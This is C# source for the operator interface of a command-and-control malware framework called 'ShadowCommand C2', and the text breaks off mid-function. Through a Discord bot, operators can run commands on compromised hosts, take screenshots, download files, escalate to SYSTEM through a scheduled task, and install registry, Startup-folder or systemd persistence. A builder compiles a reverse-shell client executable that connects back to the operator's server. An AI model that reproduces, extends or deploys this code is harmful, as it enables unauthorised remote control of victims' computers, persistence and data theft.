using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;


namespace C2Framework
{
    public static class Extensions
    {
        public static int Count<T>(this Dictionary<string, T> dictionary, Func<KeyValuePair<string, T>, bool> predicate)
        {
            int count = 0;
            foreach (var item in dictionary)
            {
                if (predicate(item))
                {
                    count++;
                }
            }
            return count;
        }
    }

    public partial class MainForm : Form


    {
        private Button btnManageUsers;
        private OperatorProfile _selectedProfile;
        private TcpClient _operatorConnection;
        private Stream _operatorStream;
        private bool _isOperatorConnected = false;
        private string _operatorUsername;
        private Task _operatorReceiveTask;
        private ListView lvOperators;
        private bool _multiplayerEnabled = false;
        private DateTime _lastClientListRequest = DateTime.MinValue;
        private const int CLIENT_LIST_THROTTLE_MS = 10000;
        private int _lastKnownClientCount = 0;
        private string _currentOperatorRole = "";
        private Button btnConnectOperator;
        private Button btnToggleMultiplayer;
        private Button btnManageProfiles;
        private ComboBox cmbOperatorProfiles;
        private bool _profilesLoaded = false;
        private string _operatorActiveClientId = null;
        private int _lastOperatorCount = -1;
        private System.Threading.Timer _clientHeartbeatTimer;
        private volatile bool _operatorConnectionInProgress = false;
        private volatile bool _operatorAuthenticationFailed = false;
        private List<string> _commandHistory = new List<string>();
        private int _commandHistoryIndex = -1;
        private FlowLayoutPanel activityPanel;
        private System.Windows.Forms.Timer activityCleanupTimer;
        private C2Server _server;
        private System.Windows.Forms.Timer _statusTimer;
        private bool _isServerRunning = false;
        private Color[] _gradientColors;
        private int _port = 443;
        private string _downloadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "C2Downloads");
        private Task _currentUploadTask = null;
        private readonly object _uploadLock = new object();
        private ToolStripProgressBar uploadProgressBar;
        private static Dictionary<string, string> _uploadedAgents = new Dictionary<string, string>();
        private string _lastSelectedAgentPath = null;
        private X509Certificate2 _serverCertificate;
        private DiscordNotificationManager discordManager;
        private NetworkTopologyViewer _topologyViewer;
        private Button btnToggleView;
        private bool _isTopologyView = false;


        public MainForm()
        {
            InitializeComponent();
            this.Resize += MainForm_Resize;
            FixLayoutIssue();
            InitializeGradientColors();
            InitializeStatusTimer();
            InitializeContextMenu();

            ApplyDarkTheme();
            SetupCommandHistory();
            SetupActivityMonitor();
            AddClientBuilderButton();

            AddMultiplayerButtons();
            SetupOperatorListView();

            _multiplayerEnabled = false;

            LoadMultiplayerSettings();
            InitializeTopologyViewer();
            AddTopologyRefreshButton();
            discordManager = new DiscordNotificationManager();
            discordManager.OutputMessage += (sender, e) => LogMessage(e.Message, e.Color);
            discordManager.CommandReceived += DiscordManager_CommandReceived;

            if (!Directory.Exists(_downloadPath))
            {
                Directory.CreateDirectory(_downloadPath);
            }
        }
        private void InitializeTopologyViewer()
        {
            // Create the topology viewer
            _topologyViewer = new NetworkTopologyViewer
            {
                Dock = DockStyle.Fill,
                Visible = false
            };

            splitContainer1.Panel1.Controls.Add(_topologyViewer);

            // Set up event handlers
            _topologyViewer.BeaconSelected += TopologyViewer_BeaconSelected;
            _topologyViewer.BeaconDoubleClicked += TopologyViewer_BeaconDoubleClicked;
            _topologyViewer.PrivilegeRefreshRequested += TopologyViewer_PrivilegeRefreshRequested;

            // Set up mouse events for context menu
            SetupTopologyEvents();

            // Create toggle button - MOVED TO TOP LEFT
            btnToggleView = new Button
            {
                Text = "🗂️ List View",
                Location = new Point(1320, 10),
                Size = new Size(120, 26),
                Name = "btnToggleView",
                TabIndex = 0,  // First in tab order since it's top left
                UseVisualStyleBackColor = true,
                Font = new Font(this.Font.FontFamily, 8.25F, FontStyle.Bold) // Make it slightly more prominent
            };

            StyleButton(btnToggleView, Color.FromArgb(75, 0, 130)); // Purple
            btnToggleView.Click += BtnToggleView_Click;
            panel2.Controls.Add(btnToggleView);
        }

        private void TopologyViewer_PrivilegeRefreshRequested(object sender, EventArgs e)
        {
            // Force refresh of client list to get updated privileges
            if (_server != null && !_isOperatorConnected)
            {
                // For local server, request fresh client information
                Task.Run(() =>
                {
                    this.Invoke(new Action(() =>
                    {
                        RefreshClientList();
                    }));
                });
            }
            else if (_isOperatorConnected)
            {
                // For operator mode, request fresh client list from server
                Task.Run(async () => await RequestClientListFromServer());
            }
        }

        private void SetupTopologyEvents()
        {
            _topologyViewer.MouseClick += OnTopologyRightClick;
        }

        private void TopologyViewer_BeaconSelected(object sender, BeaconSelectedEventArgs e)
        {
            // Sync selection with list view
            foreach (ListViewItem item in lvClients.Items)
            {
                if (item.Tag?.ToString() == e.BeaconId)
                {
                    item.Selected = true;
                    item.EnsureVisible();
                    break;
                }
            }

        }

        private void TopologyViewer_BeaconDoubleClicked(object sender, BeaconDoubleClickEventArgs e)
        {
            // Connect to the beacon when double-clicked
            if (_currentOperatorRole == "Observer")
            {
                LogMessage("[!] Observer role cannot connect to client sessions", Color.Orange);
                return;
            }

            ProcessCommand($"connect {e.BeaconId}");
        }

        private void BtnToggleView_Click(object sender, EventArgs e)
        {
            _isTopologyView = !_isTopologyView;

            if (_isTopologyView)
            {
                // Switch to topology view
                lvClients.Visible = false;
                _topologyViewer.Visible = true;
                btnToggleView.Text = "📊 Topology View";
                StyleButton(btnToggleView, Color.FromArgb(0, 120, 215));

                // Update topology with current clients
                UpdateTopologyView();

                LogMessage("[*] Switched to network topology view", Color.Cyan);
            }
            else
            {
                // Switch to list view  
                _topologyViewer.Visible = false;
                lvClients.Visible = true;
                btnToggleView.Text = "🗂️ List View";
                StyleButton(btnToggleView, Color.FromArgb(75, 0, 130));

                LogMessage("[*] Switched to list view", Color.Cyan);
            }
        }

        private void AddTopologyRefreshButton()
        {
            Button btnRefreshTopology = new Button
            {
                Text = "🔄 Refresh Topology",
                Location = new Point(1450, 10),
                Size = new Size(120, 26),
                Name = "btnRefreshTopology",
                TabIndex = 9,
                UseVisualStyleBackColor = true,
                Visible = _isTopologyView // Only show when in topology view
            };

            StyleButton(btnRefreshTopology, Color.FromArgb(255, 165, 0)); // Orange
            btnRefreshTopology.Click += (s, e) =>
            {
                LogMessage("[*] Manually refreshing topology view...", Color.Yellow);
                UpdateTopologyView();

                if (_isOperatorConnected)
                {
                    Task.Run(async () => await RequestClientListFromServer());
                }
            };

            panel2.Controls.Add(btnRefreshTopology);
        }
        private async void DiscordManager_CommandReceived(object sender, DiscordCommandEventArgs e)
        {
            try
            {

                string commandType = e.IsBuiltIn ? "BUILT-IN" : "DIRECT";
                LogMessage($"[DISCORD] Processing {commandType} command from {e.AuthorName}: {e.Command}", Color.Magenta);

                // Log important commands for tracking
                if (e.IsBuiltIn || IsImportantDirectCommand(e.Command))
                {
                    await discordManager.LogCommandExecution(e.Command, _server?.ActiveClientId, e.AuthorName);
                }

                string response = await ProcessDiscordCommand(e.Command, e.IsBuiltIn);

                // Determine if this was an error
                bool isError = response.StartsWith("❌") || response.Contains("Error") || response.Contains("Failed");

                // Send enhanced response
                await discordManager.SendFormattedCommandResponse(response, e.MessageId, isError);

            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error processing Discord command: {ex.Message}", Color.Red);
                await discordManager.SendFormattedCommandResponse($"❌ Error: {ex.Message}", e.MessageId, true);
            }
        }
        private bool IsImportantDirectCommand(string command)
        {
            string[] importantCommands = {
        "whoami", "hostname", "systeminfo", "ipconfig", "netstat", "tasklist",
        "net", "reg", "powershell", "wmic", "schtasks", "sc", "route", "arp"
    };

            string cmdWord = command.Split(' ')[0].ToLower();
            return importantCommands.Any(important => cmdWord.StartsWith(important));
        }
        private async Task<string> ProcessDiscordCommand(string command, bool isBuiltIn = false)
        {
            try
            {
                // If it's NOT a built-in command, execute directly on beacon
                if (!isBuiltIn)
                {
                    if (_server?.ActiveClientId != null)
                    {
                        return ExecuteBeaconCommand(command);
                    }
                    else
                    {
                        return $"❌ **No active beacon connection**\n" +
                               "Use `!connect <beacon_id>` to connect to a beacon first.\n" +
                               "Use `!beacons` to see available beacons.";
                    }
                }

                // Handle built-in commands (with ! prefix)
                string[] parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length == 0) return "No command provided.";

                string cmd = parts[0].ToLower();

                switch (cmd)
                {
                    case "help":
                        return GetDiscordHelpText();

                    case "status":
                        return GetServerStatus();

                    case "beacons":
                    case "list":
                        return GetBeaconsList();

                    case "uptime":
                        return GetServerUptime();

                    case "version":
                        return "ShadowCommand C2 Framework v1.6.0";

                    case "connect":
                        if (parts.Length < 2) return "Usage: !connect <beacon_id>";
                        return ConnectToBeacon(parts[1]);

                    case "disconnect":
                        return DisconnectFromBeacon();

                    case "kill":
                        if (parts.Length < 2) return "Usage: !kill <beacon_id>";
                        return HandleKillCommand(parts[1]);

                    case "screenshot":
                    case "screen":
                        return await CaptureScreenshotCommand();

                    case "download":
                        if (parts.Length < 2) return "Usage: !download <remote_path>";
                        return await HandleDownloadCommand(parts[1]);

                    case "getsystem":
                        if (_server == null) return "Server is not running.";

                        if (string.IsNullOrEmpty(_server.ActiveClientId))
                        {
                            return "❌ **No active beacon connection**\n" +
                                   "Use `!connect <beacon_id>` to connect to a beacon first.\n" +
                                   "Use `!beacons` to see available beacons.";
                        }

                        var activeClient = _server.GetActiveClient();
                        if (activeClient?.IsLinux == true)
                        {
                            return "❌ **GetSystem not supported on Linux**\n" +
                                   "This method is currently only available for Windows targets.";
                        }

                        try
                        {
                            // Execute the existing getsystem logic on main thread
                            this.Invoke(new Action(() =>
                            {
                                FindAgentAndExecute(async (agentPath) =>
                                {
                                    await _server.ElevateToSystemWithUpload(agentPath);
                                }, "Elevate to SYSTEM using uploaded agent");
                            }));

                            return "🚀 **SYSTEM Elevation Initiated**\n" +
                                   $"**Target Beacon:** {_server.ActiveClientId}\n" +
                                   $"**Method:** Scheduled Task with Agent Upload\n" +
                                   "**Status:** Attempting privilege escalation...\n\n" +
                                   "💡 **Watch for:**\n" +
                                   "• New SYSTEM session connecting\n" +
                                   "• Elevation success messages\n" +
                                   "• Temporary files cleanup";
                        }
                        catch (Exception ex)
                        {
                            return $"❌ **GetSystem Error:** {ex.Message}";
                        }

                    case "persist":
                        if (_server == null) return "Server is not running.";

                        if (string.IsNullOrEmpty(_server.ActiveClientId))
                        {
                            return "❌ **No active beacon connection**\n" +
                                   "Use `!connect <beacon_id>` to connect to a beacon first.";
                        }

                        var persistClient = _server.GetActiveClient();
                        if (persistClient == null)
                        {
                            return "❌ **Active client not found**";
                        }

                        // Parse persistence method
                        string[] persistParts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);

                        if (persistParts.Length == 1)
                        {
                            // Show persistence menu based on OS
                            if (persistClient.IsLinux)
                            {
                                return "🐧 **Linux Persistence Methods**\n\n" +
                                       "**Available Options:**\n" +
                                       "• `!persist -t 300` - Systemd service, restart every 5 minutes\n" +
                                       "• `!persist -t 600` - Systemd service, restart every 10 minutes\n" +
                                       "• `!persist -t 1800` - Systemd service, restart every 30 minutes\n\n" +
                                       "**Usage:** `!persist -t <seconds>`\n" +
                                       "**Note:** Requires root privileges for systemd service creation.";
                            }
                            else
                            {
                                return "🪟 **Windows Persistence Methods**\n\n" +
                                       "**Available Options:**\n" +
                                       "• `!persist 1` - Registry autorun (HKCU) - Current user only\n" +
                                       "• `!persist 2` - Registry autorun (HKLM) - All users (admin required)\n" +
                                       "• `!persist 3` - Startup folder - Current user only\n\n" +
                                       "**Usage:** `!persist <number>`\n" +
                                       "**Note:** Some methods require administrative privileges.";
                            }
                        }
                        else
                        {
                            try
                            {
                                if (persistClient.IsLinux)
                                {
                                    // Handle Linux persistence with time parameter
                                    if (persistParts.Length >= 3 && persistParts[1] == "-t")
                                    {
                                        string timeArg = persistParts[2];

                                        this.Invoke(new Action(() =>
                                        {
                                            ProcessCommand($"persist -t {timeArg}");
                                        }));

                                        return $"🐧 **Linux Persistence Initiated**\n" +
                                               $"**Target:** {_server.ActiveClientId}\n" +
                                               $"**Method:** Systemd service with {timeArg}s restart interval\n" +
                                               "**Status:** Installing persistence mechanism...";
                                    }
                                    else
                                    {
                                        return "❌ **Invalid Linux persistence syntax**\n" +
                                               "Use: `!persist -t <seconds>`\n" +
                                               "Example: `!persist -t 300` (5 minutes)";
                                    }
                                }
                                else
                                {
                                    // Handle Windows persistence with method number
                                    if (int.TryParse(persistParts[1], out int method) && method >= 1 && method <= 3)
                                    {
                                        this.Invoke(new Action(() =>
                                        {
                                            ProcessCommand($"persist {method}");
                                        }));

                                        string methodName = method switch
                                        {
                                            1 => "Registry Autorun (HKCU)",
                                            2 => "Registry Autorun (HKLM)",
                                            3 => "Startup Folder",
                                            _ => "Unknown"
                                        };

                                        return $"🪟 **Windows Persistence Initiated**\n" +
                                               $"**Target:** {_server.ActiveClientId}\n" +
                                               $"**Method:** {methodName}\n" +
                                               "**Status:** Installing persistence mechanism...";
                                    }
                                    else
                                    {
                                        return "❌ **Invalid Windows persistence method**\n" +
                                               "Use: `!persist <1-3>`\n" +
                                               "• 1 = Registry (HKCU)\n" +
                                               "• 2 = Registry (HKLM)\n" +
                                               "• 3 = Startup Folder";
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                return $"❌ **Persistence Error:** {ex.Message}";
                            }
                        }


                    default:
                        return $"❌ **Unknown built-in command:** `!{cmd}`\n" +
                               "Use `!help` to see available built-in commands.\n" +
                               "For beacon commands, don't use the `!` prefix.";
                }
            }
            catch (Exception ex)
            {
                return $"❌ **Error processing Discord command:** {ex.Message}";
            }
        }

        private async Task<string> CaptureScreenshotCommand()
        {
            if (_server == null) return "❌ Server is not running.";

            if (string.IsNullOrEmpty(_server.ActiveClientId))
            {
                return "❌ **No active beacon connection**\n" +
                       "Use `!connect <beacon_id>` to connect to a beacon first.\n" +
                       "Use `!beacons` to see available beacons.";
            }

            try
            {
                var activeClient = _server.GetActiveClient();
                if (activeClient?.IsLinux == true)
                {
                    return "❌ **Screenshot not supported on Linux targets**\n" +
                           "This feature is only available for Windows beacons.";
                }

                this.Invoke(new Action(() =>
                {
                    _server.CaptureScreenshot(_server.GetDownloadDirectory(), sendToDiscord: true);
                }));

                return $"📸 **Screenshot capture initiated**\n" +
                       $"🎯 **Target:** `{_server.ActiveClientId}`\n" +
                       $"📤 **Auto-upload:** Enabled - will upload to this channel\n" +
                       $"⏳ **Status:** Processing... please wait 5-10 seconds\n\n" +
                       $"💡 The screenshot will appear in this channel automatically once ready!";
            }
            catch (Exception ex)
            {
                return $"❌ **Error capturing screenshot:** {ex.Message}";
            }
        }

        private async Task<string> HandleDownloadCommand(string remotePath)
        {
            if (_server == null) return "Server is not running.";

            if (string.IsNullOrEmpty(_server.ActiveClientId))
            {
                return "No active beacon connection. Use !connect <id> to connect to a beacon first.";
            }

            try
            {
                // Execute download command on main thread
                this.Invoke(new Action(() =>
                {
                    _server.DownloadFile(remotePath, _server.GetDownloadDirectory());
                }));

                return $"📥 **Download initiated**\n" +
                       $"**File:** `{remotePath}`\n" +
                       $"**From:** {_server.ActiveClientId}\n" +
                       $"**To:** Server downloads directory\n\n" +
                       "Check the main C2 interface for download progress and completion status.";
            }
            catch (Exception ex)
            {
                return $"❌ Error initiating download: {ex.Message}";
            }
        }

        private async Task<string> HandleGetSystemCommand()
        {
            if (_server == null) return "Server is not running.";

            if (string.IsNullOrEmpty(_server.ActiveClientId))
            {
                return "❌ **No active beacon connection**\n" +
                       "Use `!connect <beacon_id>` to connect to a beacon first.\n" +
                       "Use `!beacons` to see available beacons.";
            }

            var activeClient = _server.GetActiveClient();
            if (activeClient?.IsLinux == true)
            {
                return "❌ **GetSystem not supported on Linux**\n" +
                       "This method is currently only available for Windows targets.";
            }

            try
            {
                // Execute the existing getsystem logic on main thread
                this.Invoke(new Action(() =>
                {
                    FindAgentAndExecute(async (agentPath) =>
                    {
                        await _server.ElevateToSystemWithUpload(agentPath);
                    }, "Elevate to SYSTEM using uploaded agent");
                }));

                return "🚀 **SYSTEM Elevation Initiated**\n" +
                       $"**Target Beacon:** {_server.ActiveClientId}\n" +
                       $"**Method:** Scheduled Task with Agent Upload\n" +
                       "**Status:** Attempting privilege escalation...\n\n" +
                       "💡 **Watch for:**\n" +
                       "• New SYSTEM session connecting\n" +
                       "• Elevation success messages\n" +
                       "• Temporary files cleanup";
            }
            catch (Exception ex)
            {
                return $"❌ **GetSystem Error:** {ex.Message}";
            }
        }
        private string HandleKillCommand(string beaconId)
        {
            if (_server == null) return "Server is not running.";

            try
            {
                var client = _server.GetClients().FirstOrDefault(c => c.ClientId.Equals(beaconId, StringComparison.OrdinalIgnoreCase) && c.IsConnected);

                if (client == null)
                {
                    return $"❌ Beacon '{beaconId}' not found or not connected.";
                }

                // Execute kill command on main thread
                this.Invoke(new Action(() =>
                {
                    _server.KillClient(beaconId);
                }));

                return $"💀 **Beacon terminated**: {beaconId}\n" +
                       $"**Target:** {client.ClientInfo}\n" +
                       "The beacon connection has been forcefully closed.";
            }
            catch (Exception ex)
            {
                return $"❌ Error killing beacon: {ex.Message}";
            }
        }

        private string GetPivotHelpText()
        {
            return "**🔄 Pivot Command Help**\n\n" +
                   "**SCShell Method:**\n" +
                   "Modifies Windows services for lateral movement.\n" +
                   "Requires administrative privileges on target.\n\n" +
                   "**Usage Examples:**\n" +
                   "• `!pivot scshell` - Basic SCShell pivot\n\n" +
                   "**Prerequisites:**\n" +
                   "• Admin privileges on current beacon\n" +
                   "• Network connectivity to pivot target\n" +
                   "• Target must allow service modifications";
        }

        private string GetDiscordHelpText()
        {
            return @"# 🤖 ShadowCommand C2 - Discord Commands

## 📊 **Server Management Commands** (use `!` prefix)
```
!help           Show this help message
!status         Show server status and active beacons  
!beacons        List all connected beacons with details
!uptime         Show C2 server uptime
!version        Show framework version information
```

## 🎯 **Beacon Control Commands** (use `!` prefix)
```
!connect <id>   Connect to a specific beacon
!disconnect     Disconnect from current beacon
!kill <id>      Terminate a beacon connection
```

## 🛠️ **Operations Commands** (use `!` prefix)
```
!screenshot     Capture desktop screenshot
!download <path> Download file from target
!upload <file>  Upload file to target
!persist <method> Install persistence mechanism
!getsystem      Attempt privilege escalation
```

## 💻 **Direct Beacon Commands** (NO `!` prefix)
*Type commands normally - they execute directly on the connected beacon*

### 🪟 ** Commands:**
```
whoami          Show current user and privileges
hostname        Display computer name
pwd             Current working directory
```


## 🚀 **Quick Start Guide:**
1. **First:** Use `!beacons` to see available targets
2. **Connect:** Use `!connect <beacon_id>` to select a target
3. **Explore:** Use commands like `whoami`, `pwd`, `ps` 
4. **Operate:** Use `!screenshot`, `!download`, etc.
---
*🔗 Connected to ShadowCommand C2 Framework*";
        }


        private string GetServerStatus()
        {
            if (_server == null) return "Server is not running.";

            int activeBeacons = _server.ClientCount;
            TimeSpan uptime = _server.Uptime;
            string activeClientId = _server.ActiveClientId ?? "None";

            var status = new StringBuilder();
            status.AppendLine($"**Server Status:**");
            status.AppendLine($"• Active Beacons: {activeBeacons}");
            status.AppendLine($"• Uptime: {uptime.Days}d {uptime.Hours}h {uptime.Minutes}m");
            status.AppendLine($"• Active Session: {activeClientId}");

            if (activeBeacons > 0)
            {
                status.AppendLine("\n**Connected Beacons:**");
                foreach (var client in _server.GetClients().Where(c => c.IsConnected))
                {
                    string userInfo = string.IsNullOrEmpty(client.UserName) ? "Unknown" : client.UserName;
                    string adminStatus = client.IsAdmin ? " (Admin)" : "";
                    string encryption = client.IsEncrypted ? "🔒" : "🔓";

                    status.AppendLine($"• {client.ClientId} - {client.ClientInfo} - {userInfo}{adminStatus} {encryption}");
                }
            }

            return status.ToString();
        }

        private string GetBeaconsList()
        {
            if (_server == null) return "Server is not running.";

            var clients = _server.GetClients().Where(c => c.IsConnected).ToList();

            if (!clients.Any())
            {
                return "No active beacons.";
            }

            var beacons = new StringBuilder();
            beacons.AppendLine($"**Active Beacons ({clients.Count}):**");

            foreach (var client in clients)
            {
                string userInfo = string.IsNullOrEmpty(client.UserName) ? "Gathering..." : client.UserName;
                string computerInfo = string.IsNullOrEmpty(client.ComputerName) ? "Unknown" : client.ComputerName;

                string privilegeStatus;
                if (userInfo.EndsWith("$"))
                {
                    privilegeStatus = " 🖥️ (Computer Account)";
                }
                else if (userInfo.Contains("SYSTEM") || userInfo.Contains("NT AUTHORITY"))
                {
                    privilegeStatus = " ⚡ (SYSTEM)";
                }
                else if (client.IsAdmin)
                {
                    privilegeStatus = " 👑 (Administrator)";
                }
                else
                {
                    privilegeStatus = " 👤 (Standard User)";
                }

                string encryption = client.IsEncrypted ? "🔒" : "🔓";
                string osInfo = string.IsNullOrEmpty(client.OSVersion) ? "Unknown OS" : client.OSVersion;

                beacons.AppendLine($"**{client.ClientId}** {encryption}");
                beacons.AppendLine($"  └ {client.ClientInfo}");
                beacons.AppendLine($"  └ {userInfo}@{computerInfo}{privilegeStatus}");
                beacons.AppendLine($"  └ {osInfo}");
                beacons.AppendLine();
            }

            return beacons.ToString();
        }
        private string GetServerUptime()
        {
            if (_server == null) return "Server is not running.";

            TimeSpan uptime = _server.Uptime;
            return $"Server uptime: {uptime.Days} days, {uptime.Hours} hours, {uptime.Minutes} minutes";
        }

        private string ConnectToBeacon(string beaconId)
        {
            if (_server == null) return "Server is not running.";

            var client = _server.GetClients().FirstOrDefault(c => c.ClientId.Equals(beaconId, StringComparison.OrdinalIgnoreCase) && c.IsConnected);

            if (client == null)
            {
                return $"Beacon '{beaconId}' not found or not connected. Use !beacons to see available beacons.";
            }

            // Execute connect command on the main thread
            this.Invoke(new Action(() =>
            {
                _server.ConnectToClient(beaconId);
            }));

            return $"Connected to beacon {beaconId} ({client.ClientInfo})";
        }

        private string DisconnectFromBeacon()
        {
            if (_server == null) return "Server is not running.";

            if (string.IsNullOrEmpty(_server.ActiveClientId))
            {
                return "No active beacon connection.";
            }

            string currentBeacon = _server.ActiveClientId;

            // Execute disconnect command on the main thread
            this.Invoke(new Action(() =>
            {
                _server.DisconnectClient();
            }));

            return $"Disconnected from beacon {currentBeacon}";
        }


        private string ExecuteBeaconCommand(string command)
        {
            if (_server == null) return "Server is not running.";

            if (string.IsNullOrEmpty(_server.ActiveClientId))
            {
                return "No active beacon connection. Use !connect <id> to connect to a beacon first.";
            }

            try
            {
                string activeBeacon = _server.ActiveClientId;
                var commandOutput = new StringBuilder();
                var responseReceived = new TaskCompletionSource<string>();
                bool commandStarted = false;

                // Create event handler to capture output
                EventHandler<OutputMessageEventArgs> outputHandler = null;
                outputHandler = (sender, e) =>
                {
                    string message = e.Message.Trim();

                    // Skip empty messages and debug messages
                    if (string.IsNullOrWhiteSpace(message) || message.Contains("[DEBUG]"))
                        return;

                    // Check if this is our command being echoed
                    if (message.Contains($"[{activeBeacon}] > {command}"))
                    {
                        commandStarted = true;
                        return;
                    }

                    // If command has started, capture output
                    if (commandStarted)
                    {
                        // Skip timestamp prefixes like [22:57:01]
                        string cleanMessage = System.Text.RegularExpressions.Regex.Replace(message, @"^\[\d{2}:\d{2}:\d{2}\]\s*", "");

                        commandOutput.AppendLine(cleanMessage);

                        // Simple heuristic: if we get a new command prompt or certain end indicators
                        if (cleanMessage.Contains($"[{activeBeacon}] >") ||
                            cleanMessage.Contains("C:\\") && cleanMessage.EndsWith(">") ||
                            commandOutput.Length > 100) // Reasonable output length reached
                        {
                            _server.OutputMessage -= outputHandler;
                            responseReceived.TrySetResult(commandOutput.ToString().Trim());
                        }
                    }
                };

                // Subscribe to output events
                _server.OutputMessage += outputHandler;

                // Execute command on main thread
                this.Invoke(new Action(() =>
                {
                    _server.SendCommand(command);
                }));

                // Set up timeout
                Task.Run(async () =>
                {
                    await Task.Delay(5000);
                    _server.OutputMessage -= outputHandler;

                    if (!responseReceived.Task.IsCompleted)
                    {
                        string partialOutput = commandOutput.ToString().Trim();
                        if (string.IsNullOrEmpty(partialOutput))
                        {
                            responseReceived.TrySetResult($"⏱️ Command '{command}' executed but no output received within timeout.");
                        }
                        else
                        {
                            responseReceived.TrySetResult(partialOutput);
                        }
                    }
                });

                // Wait for response
                string result = responseReceived.Task.Result;

                if (string.IsNullOrWhiteSpace(result))
                {
                    return $"✅ Command '{command}' executed on beacon {activeBeacon}\n⚠️ No output captured";
                }

                // Limit response length for Discord (Discord has a 2000 char limit)
                if (result.Length > 1800)
                {
                    result = result.Substring(0, 1800) + "\n\n... (output truncated - too long for Discord)";
                }

                return $"📋 **Command:** `{command}`\n```\n{result}\n```";
            }
            catch (Exception ex)
            {
                return $"❌ Error executing command: {ex.Message}";
            }
        }
        private void AddClientBuilderButton()
        {
            // Position the button to the right of the Port textbox
            Button btnBuildClient = new Button
            {
                Text = "Build Client",
                Location = new Point(560, 10),  // Right after Start Server button
                Size = new Size(105, 26),       // Same size as Start Server
                Name = "btnBuildClient",       // Add name for consistency
                TabIndex = 3,                  // Set tab order
                UseVisualStyleBackColor = true // Same as Start Server
            };


            StyleButton(btnBuildClient, Color.FromArgb(0, 120, 215));

            btnBuildClient.Click += (sender, e) =>
            {
                // Simple input form
                Form inputForm = new Form
                {
                    Text = "Build Client",
                    Size = new Size(350, 200),
                    StartPosition = FormStartPosition.CenterParent,
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    BackColor = Color.FromArgb(30, 30, 30),
                    ForeColor = Color.FromArgb(220, 220, 220)
                };

                Label lblIP = new Label { Text = "Server IP:", Location = new Point(20, 20), AutoSize = true };
                TextBox txtIP = new TextBox
                {
                    Location = new Point(100, 17),
                    Size = new Size(200, 23),
                    BackColor = Color.FromArgb(45, 45, 48),
                    ForeColor = Color.FromArgb(220, 220, 220),
                    Text = txtIPAddress.Text  // Use current server IP as default
                };

                Label lblPort = new Label { Text = "Port:", Location = new Point(20, 50), AutoSize = true };
                TextBox txtBuildPort = new TextBox
                {
                    Location = new Point(100, 47),
                    Size = new Size(100, 23),
                    BackColor = Color.FromArgb(45, 45, 48),
                    ForeColor = Color.FromArgb(220, 220, 220),
                    Text = txtPort.Text  // Use current server port as default
                };

                Button btnOK = new Button
                {
                    Text = "Build",
                    Location = new Point(100, 90),
                    Size = new Size(80, 30),
                    DialogResult = DialogResult.OK,
                    FlatStyle = FlatStyle.Flat,
                    BackColor = Color.FromArgb(0, 120, 215),
                    ForeColor = Color.White
                };

                Button btnCancel = new Button
                {
                    Text = "Cancel",
                    Location = new Point(190, 90),
                    Size = new Size(80, 30),
                    DialogResult = DialogResult.Cancel,
                    FlatStyle = FlatStyle.Flat,
                    BackColor = Color.FromArgb(45, 45, 48),
                    ForeColor = Color.FromArgb(220, 220, 220)
                };

                inputForm.Controls.AddRange(new Control[] { lblIP, txtIP, lblPort, txtBuildPort, btnOK, btnCancel });

                if (inputForm.ShowDialog() == DialogResult.OK)
                {
                    string ip = txtIP.Text;
                    if (!int.TryParse(txtBuildPort.Text, out int port))
                    {
                        LogMessage("[!] Invalid port number", Color.Red);
                        return;
                    }

                    string outputFileName = $"client_{ip.Replace(".", "_")}_{port}_{DateTime.Now:yyyyMMdd_HHmmss}.exe";
                    string outputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Guid.NewGuid().ToString());
                    string outputPath = Path.Combine(outputDir, outputFileName);

                    LogMessage($"[*] Building client for {ip}:{port}...", Color.Yellow);

                    // Build the client
                    Task.Run(() =>
                    {
                        try
                        {
                            // Check for running ReverseShellClient processes
                            var processes = Process.GetProcessesByName("ReverseShellClient");
                            if (processes.Length > 0)
                            {
                                this.Invoke(new Action(() =>
                                {
                                    LogMessage("[!] Warning: Running ReverseShellClient processes detected. Close them to avoid build conflicts.", Color.Yellow);
                                }));
                            }

                            // Generate client source code using the separate class
                            string clientSource = ClientSourceGenerator.GenerateClientSource(ip, port);

                            // Create a temporary directory for the project
                            string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                            Directory.CreateDirectory(tempDir);

                            try
                            {
                                // Write the client source code to a file
                                string sourceFilePath = Path.Combine(tempDir, "Program.cs");
                                File.WriteAllText(sourceFilePath, clientSource);

                                // Create project file using the separate class
                                string csprojContent = ClientSourceGenerator.GetProjectFileContent();
                                string csprojFilePath = Path.Combine(tempDir, "ReverseShellClient.csproj");
                                File.WriteAllText(csprojFilePath, csprojContent);

                                // Create the output directory
                                Directory.CreateDirectory(outputDir);

                                // Run dotnet build
                                ProcessStartInfo psi = new ProcessStartInfo
                                {
                                    FileName = "dotnet",
                                    Arguments = $"publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -p:PublishTrimmed=true -p:TrimMode=link -p:IncludeNativeDebugSymbols=false -p:EnableComHosting=false -p:EnableUnsafeBinaryFormatterSerialization=false -p:EventSourceSupport=false -o \"{outputDir}\" --verbosity diagnostic",
                                    WorkingDirectory = tempDir,
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };

                                using (Process process = new Process { StartInfo = psi })
                                {
                                    StringBuilder output = new StringBuilder();
                                    StringBuilder errors = new StringBuilder();

                                    process.OutputDataReceived += (s, evt) =>
                                    {
                                        if (evt.Data != null) output.AppendLine(evt.Data);
                                    };
                                    process.ErrorDataReceived += (s, evt) =>
                                    {
                                        if (evt.Data != null) errors.AppendLine(evt.Data);
                                    };

                                    process.Start();
                                    process.BeginOutputReadLine();
                                    process.BeginErrorReadLine();
                                    process.WaitForExit();

                                    if (File.Exists(Path.Combine(outputDir, "ReverseShellClient.exe")))
                                    {
                                        var fileInfo = new FileInfo(Path.Combine(outputDir, "ReverseShellClient.exe"));
                                        this.Invoke(new Action(() =>
                                        {
                                            LogMessage($"[+] Output file size: {fileInfo.Length / 1024 / 1024:N2} MB", Color.Green);
                                            LogMessage($"[+] Trimming enabled: {output.ToString().Contains("Trimming enabled")}", Color.Green);
